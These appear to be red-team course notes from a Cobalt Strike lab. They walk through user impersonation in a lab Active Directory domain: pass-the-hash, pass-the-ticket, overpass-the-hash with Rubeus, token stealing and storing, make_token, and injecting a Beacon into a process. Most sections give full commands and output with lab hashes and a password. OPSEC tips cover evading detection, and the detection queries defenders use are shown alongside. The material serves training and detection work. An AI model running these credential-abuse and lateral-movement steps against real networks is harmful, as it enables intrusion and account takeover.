---
description: 09/17/2025
---

# User Impersonation

## Introduction/Motivation

From our initial enumeration and efforts, we know our domain recon that `jking` is a local administrator on multiple computers via his membership of the _**Support Engineers**_ domain group.

We also have credential material for this user in the form of an NTLM hash, AES-256 hash and a Kerberos TGT.

This section demonstrates different techniques in which we can leverage these credentials and use them to access one of the target computers.

There are also several techniques where we don't need credential material directly, but that take advantage of processes that the user is running on a machine we have elevated access on.

{% hint style="info" %}
A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.
{% endhint %}

## Pass the Hash

This is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password.

It works by starting a new logon session with a fake identity and then replaces the session information with the domain, username, and NTLM hash provided.

Beacon has a dedicated `pth` command which executes Mimikatz in the background.

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

**First, attempt to list the `C$` share of the `web` machine - this will fail because `bfarmer` is not a local admin there:**

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

**Next, run the `pth` command with `jking`'s username and NTLM hash:**

```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

user	: jking
domain	: DEV
program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
impers.	: no
NTLM	: 59fc0f884922b4ce376051134c71e22c
  |  PID  1932
  |  TID  6600
  |  LSA Process is now R/W
  |  LUID 0 ; 7479840 (00000000:00722220)
  \_ msv1_0   - data copy @ 000001F6344B3D20 : OK !
  \_ kerberos - data copy @ 000001F6345BD7C8
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F6344C6128 (32) -> null
```

<mark style="color:yellow;">We can see that the command Mimikatz runs passes the new credentials over a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`NAMED PIPE`</mark><mark style="color:yellow;">, which Beacon will then impersonate automatically</mark>.

**We can attempt to list the `C$` share again, which will succeed:**

#### "Dropping" Impersonation

We can use the `rev2self` command afterwards to "drop" impersonation:

```
beacon> rev2self
[*] Tasked beacon to revert token

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

As you can see, we can no longer list the `C$` share since we are no longer impersonating `jking`.

{% hint style="danger" %}
OPSEC Consideration

Two opportunities to detect PTH are the `R/W` Handle to `LSASS`; and looking for the `echo foo > \\.\pipe\bar` pattern in command-line logs.
{% endhint %}

The former is already part of the "_**Suspicious Handle to LSASS**_" saved search.

This time we can see an access mask of `0x1038`. This is a combination of `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`), `PROCESS_VM_WRITE` (`0x0020`), `PROCESS_VM_READ` (`0x0010`) and `PROCESS_VM_OPERATION` (`0x0008`).

<figure><img src="../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

The latter can be found via the "_**Suspicious Named Pipe Impersonation**_" search, which queries process events where the arguments contain "`echo`", "`>`" and "`\.\pipe`".

<figure><img src="../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

## Pass the Ticket

This is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.

Accessing a remote resource will then allow that authentication to happen via Kerberos.

For this, we can leverage the TGT that we extracted from `jking`'s logon session on `Workstation 2`.

The first step is to create a blank, "sacrificial" logon session that we can pass the TGT into.

We do this because a logon session can only hold a single TGT at a time.

If we passed `jking`'s TGT into the LUID for `bfarmer`, it would erase `bfarmer`'s TGT and cause all sorts of authentication issues for the user.

{% hint style="warning" %}
Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.
{% endhint %}

**`rubeus`' `createnetonly` command will start a new hidden process of our choosing, using the** [**`CreateProcessWithLogonW()`**](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) **API:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : GJB9A2GP
[*] Domain          : VPY1XQRP
[*] Password        : R4ABN1K3
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4748
[+] LUID            : 0x798c2c
```

* As we can see, our new hidden process is `cmd.exe`.

This also creates a new LUID. It will have no tickets inside, so it won't be visible with `triage` just yet.

**The next step is to pass the TGT into this new LUID using the `rubeus`** **`ptt` command. Where the `/luid` is the new LUID we just created and `/ticket` is the base64 encoded ticket we previously extracted:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

[*] Action: Import Ticket
[*] Target LUID: 0x798c2c
[+] Ticket successfully imported!
```

**`rubeus` triage will now show `jking`'s TGT inside this LUID:**

```
 | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |
```

Lastly, impersonate the process that we created with `createnetonly` using Cobalt Strike's `steal_token` command.

At a minimum, this requires the PID of the target process, in this example is `4748`.

**We will then be able to access the remote machine:**

```
beacon> steal_token 4748

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```

As before, use the `rev2self` to "drop" the impersonation.

**To destroy the logon session we created, simply kill the process with the `kill` command:**

```
beacon> rev2self
beacon> kill 4748
```

`rubeus` triage will no longer show the logon session.

{% hint style="danger" %}
OPSEC Consideration

By default, `Rubeus` will use a random username, domain and password with `CreateProcessWithLogonW`, which will appear in the associated `4624` logon event.  The "Suspicious Logon Events" saved search will show `4624`'s where the `TargetOutboundDomainName` is not an expected value.
{% endhint %}

<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```

## Overpass the Hash

This is a technique that allows us to request a Kerberos TGT for a user, using their NTLM or AES-256 hash.&#x20;

**Elevated privileges are required to obtain user hashes**, _<mark style="color:yellow;">but not required to request a ticket</mark>_.

<mark style="color:yellow;">**`rubeus`**</mark><mark style="color:yellow;">**'**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`asktgt`**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**has the ability to do just that**</mark>:

{% code title="Using the user's NTLM Hash to request a TGT." %}
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 59fc0f884922b4ce376051134c71e22c
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88

[09/01 10:24:04] [+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmj [...snip...] 5pbw==

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/1/2022 2:23:59 PM
  EndTime                  :  9/2/2022 12:23:59 AM
  RenewTill                :  9/8/2022 2:23:59 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  NytFQCt4OMyeF+BjfPSrbw==
  ASREP (key)              :  59FC0F884922B4CE376051134C71E22C
```
{% endcode %}

This TGT, once requested and received, can be leveraged via the Pass the Ticket technique.&#x20;

{% hint style="danger" %}
OPSEC Consideration



Using an `NTLM` hash results in a ticket encrypted using `RC4` (`0x17`). This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment. The "`RC4 TGT`s" saved search will show all `4768` events where the ticket encryption type is `0x17`. It's very likely that the only result there will be the one generated from the above command.



This of course can be fingerprinted and identified as a potential IoC, alerting the blueteam of signs of compromise or tampering.
{% endhint %}

**To obtain a TGT encrypted using AES-256 (`0x12`), we can use the user's AES-256 hash instead of the NTLM hash:**

{% code title="Using the user's AES-256 Hash to request a TGT." %}
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFuj [...snip...] ljLmlv

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  9/1/2022 2:54:36 PM
  EndTime                  :  9/2/2022 12:54:36 AM
  RenewTill                :  9/8/2022 2:54:36 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  BBLSeA9nnaNeYIcHqf787V0m5Znz1ednGMXh9V9aorE=
  ASREP (key)              :  4A8A74DAAD837AE09E9ECC8C2F1B89F960188CB934DB6D4BBEBADE8318AE57C6
```
{% endcode %}

You can find the corresponding 4768 event with this query:

{% code overflow="wrap" %}
```
event.code: 4768 and winlog.event_data.TicketEncryptionType: 0x12 and winlog.event_data.TargetUserName: jking
```
{% endcode %}

<mark style="color:yellow;">**It will be practically indistinguishable from the other TGT requests, with the exception of two fields:**</mark>

1. **The Supplied Realm Name will be `dev.cyberbotic.io`, instead of `DEV`.**
2. **The Ticket Options will be `0x40800010` instead of `0x40810010`.**

#### Blending it in more...

The `asktgt` command has two optional parameters that we can use to blend it in more.

If there is no `/domain` specified, `rubeus` will use the `FQDN` of the domain this computer is in.

Instead, we can force it to use the `NetBIOS` name with `/domain:DEV`.

There is also an `/opsec` flag which tells `rubeus` to request the TGT in a way that results in the _**Ticket Options**_ being `0x40810010`.

{% code overflow="wrap" %}
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```
{% endcode %}

{% hint style="danger" %}
OPSEC Consideration

**You have a few options here:**

`Mimikatz` can also perform overpass the hash, but in a way that writes into LSASS.&#x20;

`Rubeus`' method doesn't touch `LSASS` but it does generate Kerberos traffic from an anomalous process, as this usually only occurs from LSASS.&#x20;

These can be seen using the "_**Kerberos Traffic from Suspicious Process**_" saved search.

The bottom line is that you have to "pick your poison".
{% endhint %}

This is because when LSASS is invoked, this is not typical "user behavior", which results in being flagged.

## Token Impersonation

We have already seen an example of Cobalt Strike's <mark style="color:yellow;">`steal_token`</mark> command in the context of _**pass the ticket**_.

However, <mark style="color:yellow;">if we elevate or land on a system where a user is running a process, we can impersonate its token without having to jump through additional hoops</mark>.

**If we list the running processes on&#x20;**<mark style="color:yellow;">**`Workstation 2`**</mark>**&#x20;from an elevated prompt, we will see that&#x20;**<mark style="color:yellow;">**`jking`**</mark>**&#x20;is running an instance of&#x20;**<mark style="color:yellow;">**`mmc.exe`**</mark>**:**

```
PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking
```

**We can simply steal its token and access a target:**

```
beacon> steal_token 5536

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```

**This technique works by:**

1. _**Obtaining a handle to the target process**_
2. _**Opening and duplicating its primary access token**_
3. _**Lastly, impersonating that token**_

#### Downsides...

If the user closes the process, our ability to abuse it goes away.

#### So, lesson is...

By taking the additional steps of extracting tickets or hashes, we ultimately provide ourselves a more guaranteed or _**future-proof**_ way of leveraging the credential material.

When impersonating users this way, the Cobalt Strike client will update several UI elements to help the operator (you) keep track of who (if anybody) you're Beacon is currently impersonating.

<figure><img src="../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

## Token Store

Cobalt Strike 4.8 has introduced a new set of commands called <mark style="color:yellow;">`token-store`</mark>.

<mark style="color:yellow;">This is an evolution on the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`steal_command`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">command which allows you to steal and store tokens for future use</mark>.

### Steal a token and add it to the Token Store

**In order to steal a token and add it to the Token Store, we can use&#x20;**<mark style="color:yellow;">**`token-store steal <pid>`**</mark>**:**

```
beacon> token-store steal 5536
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5536  DEV\jking
```

### Listing Tokens

**You can&#x20;**<mark style="color:yellow;">**list all the tokens in the store**</mark>**&#x20;with the&#x20;**<mark style="color:yellow;">**`token-store show`**</mark>**&#x20;command and&#x20;**<mark style="color:yellow;">**impersonate one using the**</mark><mark style="color:yellow;">**&#x20;**</mark><mark style="color:yellow;">**`token-store use <id>`**</mark>**&#x20;command:**

```
beacon> token-store use 0
[+] Impersonated DEV\jking
```

The <mark style="color:yellow;">`rev2self`</mark> command will _**drop the impersonation token**_, <mark style="color:yellow;">but it will remain in the store so that it can be impersonated again</mark>.

A <mark style="color:yellow;">token can be removed from the store</mark> using the <mark style="color:yellow;">`token-store remove <id>`</mark> or the <mark style="color:yellow;">entire store can be flushed via</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`token-store remove-all`</mark>.

### Advantages of the Token Store

**The primary advantages of the token store are two-fold:**

_<mark style="color:yellow;">**The first**</mark>_ is that we don't have to carry out the stealing process multiple times, which is better OPSEC. Since stealing a token requires opening a handle to the target process and process token, the few times you do that, the stealthier you will be.

_<mark style="color:yellow;">**The second**</mark>_ is that maintaining an open handle to the duplicated token will prevent Windows from disposing of the user's logon session if they were to logoff or terminate the process we stole from.

It is important to note that <mark style="color:yellow;">each Beacon will feature its own Token Store</mark>.

As a result, _<mark style="color:yellow;">**you cannot transfer tokens from one Beacon to another, even if they're on the same host**</mark>_.&#x20;

## Make Token

The <mark style="color:yellow;">`make_token`</mark> command _<mark style="color:yellow;">**will allow you to impersonate a user if you know their plaintext password**</mark>_.

### How this works...

Under the hood, it calls the [`LogonUserA`](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API, which <mark style="color:yellow;">takes several parameters</mark> including a <mark style="color:yellow;">username</mark>, <mark style="color:yellow;">password</mark>, <mark style="color:yellow;">domain name</mark>, and <mark style="color:yellow;">logon type</mark>.

In this instance, the <mark style="color:yellow;">`LOGON32_LOGON_NEW_CREDENTIALS`</mark> logon type is used, which allows the caller to clone its current token and specify new credentials for outbound network connections.

The API outputs a handle to a token which can then be passed to the [<mark style="color:yellow;">`ImpersonateLoggedOnUser`</mark>](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) API.&#x20;

* This allows the calling thread to impersonate the context of the token (e.g. the impersonated user's context)

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\jking (netonly)
```

**The logon session with&#x20;**<mark style="color:yellow;">**`LogonUserA`**</mark>**&#x20;has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource:**

```
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking
```

This also means that the <mark style="color:yellow;">`make_token`</mark> command is <mark style="color:yellow;">not applicable to anything you may want to run on the current machine</mark>.

* _**This is why you're going to want to use the****&#x20;**<mark style="color:yellow;">**`spawnas`**</mark>**&#x20;****command, as it may offer as a****&#x20;**<mark style="color:yellow;">**better solution**</mark>_

**These logon events can be found in Kibana with the following query:**

Where `4624` is the "An account was successfully logged on" Event ID and `LogonType 9` is `LOGON32_LOGON_NEW_CREDENTIALS`.  The events will show who the caller was, what user they impersonated, the calling process name, ID, and more.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/1f7/008/295/make-token.png)

One unfortunate downside to detecting this technique is that `runas /netonly` behaves in the same way.  So it may be difficult to distinguish legitimate and malicious events.

## Process Injection

This <mark style="color:yellow;">allows us to inject arbitrary shellcode into a process of our choosing</mark>.

_<mark style="color:yellow;">**You can only inject into processes that you can obtain a handle to with enough privileges to write into its memory**</mark>_.

### Caveats

In a **non-elevated context**, which usually limits you to your own processes.

In an **elevated context**, this includes processes owned by other users.

### Usage in Beacon (Cobalt Strike)

**Beacon has two main injection commands:**

1. <mark style="color:yellow;">`shinject`</mark>: Allows you to inject any arbitrary shellcode from a binary file on your attacking machine.
2. <mark style="color:yellow;">`inject`</mark>: Injects a full Beacon payload for the specified listener.

#### Example

**If we wanted to inject a TCP Beacon payload into the `MMC` process mentioned in the previous module, we could do:**

```
beacon> inject 4464 x64 tcp-local
[*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 4464 (x64)
[+] established link to child beacon: 10.10.123.102
```

**Syntax Overview:**

* `4464` is the target `PID`.
* `x64` is the architecture of the process.
* `tcp-local` is the listener name.

The command will also automatically attempt to connect to the child if a P2P listener is used.

The resulting Beacon will run with the full privilege of the user who owns the process.

<figure><img src="../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

The same caveats also apply.

If the user closes this process, the Beacon will be lost.

The shellcode that's injected uses an `EXIT THREAD` function, so it won't kill the process if we exit the Beacon.
